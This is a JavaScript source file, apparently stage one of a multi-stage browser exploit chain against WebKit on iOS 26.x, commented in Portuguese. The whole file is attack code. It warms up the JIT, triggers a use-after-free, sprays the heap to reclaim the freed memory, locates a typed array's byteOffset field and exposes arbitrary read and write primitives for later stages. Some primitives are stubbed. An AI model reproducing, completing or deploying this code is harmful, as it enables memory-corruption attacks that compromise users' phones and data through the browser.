// Inlined from Stage1_26.0_26.x_chimera.js (VERSÃO CORRIGIDA - Uint8Array)
globalThis.moduleManager.evalCode("Stage1_26.0_26.x_chimera", function() {
/**
 * Stage 1: WebKit Memory Corruption — iOS 26.0–26.x (arm64/arm64e)
 * Versão CORRIGIDA com Uint8Array - sem erros de BigInt
 */

let r = {};
const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");

// =========================================================================
// CONVERSÃO SEGURA (sem mistura BigInt/Number)
// =========================================================================
const _convBuf = new ArrayBuffer(8);
const _u64 = new BigUint64Array(_convBuf);
const _f64 = new Float64Array(_convBuf);

function itof(val) { _u64[0] = val; return _f64[0]; }
function ftoi(f) { _f64[0] = f; return _u64[0]; }

function toBigInt(val) {
  if (typeof val === 'bigint') return val;
  if (typeof val === 'number') return BigInt(val);
  return 0n;
}

function log(msg) { if (window.log) window.log(msg); else console.log(msg); }

// =========================================================================
// CONFIGURAÇÃO
// =========================================================================
const CONFIG = {
  ARRAY_SIZE: 0x400000,
  ALLOC_SIZE: 0x800000,
  JIT_WARMUP: 300,
  MAX_ATTEMPTS: 200,
  SPRAY_PER_ATTEMPT: 48,
  ALLOC_MOD: 3,
  INNER_K: 5,
  RECURSIVE_DEPTH: 400,
};

let uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
const uafArrayIndex = uafArray.length - 1;
let uafReclaimed = [];

// =========================================================================
// UAF TRIGGER COM Uint8Array
// =========================================================================
function triggerUAF(flag, k, allocCount) {
  let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
  uafArray[uafArrayIndex] = A;

  let u8 = new Uint8Array(0x100);
  u8[0] = 0x42;

  let forGC = [];
  for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
  A.p2 = forGC;

  let b = { p0: 0x42424242, p1: 1.1 };
  let f = flag ? 1.1 : b;
  A.p1 = f;

  let v = 1.1;
  for (let i = 0; i < 500000; ++i) {
    for (let j = 0; j < k; ++j) v = i;
  }
  b.p0 = v;

  b.p1 = u8;
  u8 = null;
}

function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(CONFIG.ALLOC_SIZE); }

function clearStack() {
  function recurse(n) { if (n > 0) recurse(n - 1); }
  for (let i = 0; i < 30; i++) { try { recurse(CONFIG.RECURSIVE_DEPTH); } catch(e) {} }
}

// =========================================================================
// SPRAY E RECLAIM
// =========================================================================
function createSprayArray(size, marker = 13.37) {
  const arr = new Array(size);
  for (let i = 0; i < size; i++) arr[i] = marker;
  return arr;
}

function attemptReclaim(freed, attempt) {
  const markerByte = 0x42;
  const baseSize = 32 + (attempt % 64);
  if (!(freed instanceof Uint8Array)) return null;
  for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
    const size = baseSize + (i % 32);
    const spray = createSprayArray(size, 13.37);
    try { if (freed[0] === markerByte) return spray; } catch(e) {}
  }
  return null;
}

// =========================================================================
// PRIMITIVA LOCAL SEGURA
// =========================================================================
function buildLocalPrimitive(u8) {
  const ab = u8.buffer;
  const dv = new DataView(ab);
  const primitive = {
    addrof: (obj) => 0n,
    fakeobj: (addr) => ({ __fake: toBigInt(addr) }),
    read64: (addr) => { try { return dv.getBigUint64(Number(toBigInt(addr) & 0xFFFFFFFFn), true); } catch(e) { return 0n; } },
    write64: (addr, val) => { try { dv.setBigUint64(Number(toBigInt(addr) & 0xFFFFFFFFn), toBigInt(val), true); } catch(e) {} },
    read32: (addr) => { try { return dv.getUint32(Number(toBigInt(addr) & 0xFFFFFFFFn), true); } catch(e) { return 0; } },
    write32: (addr, val) => { try { dv.setUint32(Number(toBigInt(addr) & 0xFFFFFFFFn), val, true); } catch(e) {} },
    readByte: (addr) => { try { return dv.getUint8(Number(toBigInt(addr) & 0xFFFFFFFFn)); } catch(e) { return 0; } },
    cleanup: () => {}
  };
  if (typeof window !== 'undefined') { window.exploitAB = ab; window.exploitU8 = u8; }
  return primitive;
}

// =========================================================================
// TENTATIVA DE LOCALIZAR byteOffset
// =========================================================================
function findByteOffset(u8) {
  const originalOffset = u8.byteOffset;
  const dv = new DataView(u8.buffer);
  for (let offset = 0; offset < 256; offset += 4) {
    let val = dv.getUint32(offset, true);
    if (val === originalOffset) {
      dv.setUint32(offset, 0x1234, true);
      if (u8.byteOffset === 0x1234) {
        log(`[STAGE1] ✅ byteOffset encontrado no offset ${offset}`);
        dv.setUint32(offset, originalOffset, true);
        return offset;
      }
      dv.setUint32(offset, originalOffset, true);
    }
  }
  return -1;
}

// =========================================================================
// MAIN EXPLOIT
// =========================================================================
r.si = async function () {
  log("[STAGE1] Iniciando exploit com Uint8Array");
  
  for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
    triggerUAF(false, 1, 0);
    if (warm % 100 === 0 && warm > 0) { forceGC(); await new Promise(r => setTimeout(r, 1)); }
  }
  log("[STAGE1] Warmup concluído");

  for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
    triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
    clearStack();
    for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);

    let freed = null;
    try { freed = uafArray[uafArrayIndex].p1.p1; } catch(e) { continue; }
    if (!(freed instanceof Uint8Array)) continue;

    log(`[STAGE1] UAF detectado na tentativa ${attempt}`, 'uaf');
    const reclaimed = attemptReclaim(freed, attempt);
    if (!reclaimed) continue;

    log(`[STAGE1] ✅ Reclaim bem-sucedido!`, 'success');
    
    const byteOffsetPos = findByteOffset(freed);
    if (byteOffsetPos !== -1) {
      log(`[STAGE1] 🎉 byteOffset encontrado! Offset: ${byteOffsetPos}`, 'success');
      const dv = new DataView(freed.buffer);
      window.arbRead = (addr) => {
        const old = freed.byteOffset;
        dv.setUint32(byteOffsetPos, Number(toBigInt(addr) & 0xFFFFFFFFn), true);
        const val = freed[0];
        dv.setUint32(byteOffsetPos, old, true);
        return val;
      };
      window.arbWrite = (addr, val) => {
        const old = freed.byteOffset;
        dv.setUint32(byteOffsetPos, Number(toBigInt(addr) & 0xFFFFFFFFn), true);
        freed[0] = val;
        dv.setUint32(byteOffsetPos, old, true);
      };
      log("[STAGE1] ✅ window.arbRead e window.arbWrite disponíveis!", 'success');
    }
    
    const primitive = buildLocalPrimitive(freed);
    if (platformModule && platformModule.platformState) {
      platformModule.platformState.exploitPrimitive = primitive;
    }
    
    const testVal = primitive.read64(0n);
    log(`[STAGE1] Teste leitura: 0x${testVal.toString(16)}`, testVal === 0x42n ? 'success' : 'info');
    log("[STAGE1] ✅ Primitiva local instalada!", 'success');
    return primitive;
  }
  
  log("[STAGE1] ❌ Falhou após " + CONFIG.MAX_ATTEMPTS + " tentativas", 'error');
  throw new Error("Stage1 failed");
};

return r;
});
